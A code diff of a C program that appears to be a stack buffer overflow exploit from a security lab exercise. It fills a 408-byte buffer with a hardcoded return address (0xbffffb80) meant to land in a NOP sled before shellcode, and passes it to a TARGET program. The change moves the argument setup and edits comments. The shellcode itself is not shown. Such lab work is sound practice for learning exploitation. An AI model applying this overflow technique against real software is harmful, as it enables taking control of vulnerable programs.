@@ -11,9 +11,6 @@ int main(void)
 {
   char *args[3]; 
   char *env[1];
-  
-  args[0] = TARGET;
-  args[1] = "";
 
   char str[408];
   memset(str, 0, 408);
@@ -26,10 +23,12 @@ int main(void)
   for (int i = 0; i < 38; ++i)
   {
     // Anything from 0xbffffb30 to 0xbffffbf0 should work
+    // the return address should point to the \x90
+    // below the shellcode
+    // above the EBP
     strcat(str, "\x80\xfb\xff\xbf");
   	// strcat(str, "\x2c\xfb\xff\xbf");
   	// strcat(str, "\x20\xfb\xff\xbf");
-    // bffffbd4
     // success
     // - 149
   	// strcat(str, "\x77\xfb\xff\xbf");
@@ -61,6 +60,7 @@ int main(void)
 
 
   }
+  args[0] = TARGET;
   args[1] = str;
   args[2] = NULL;
   
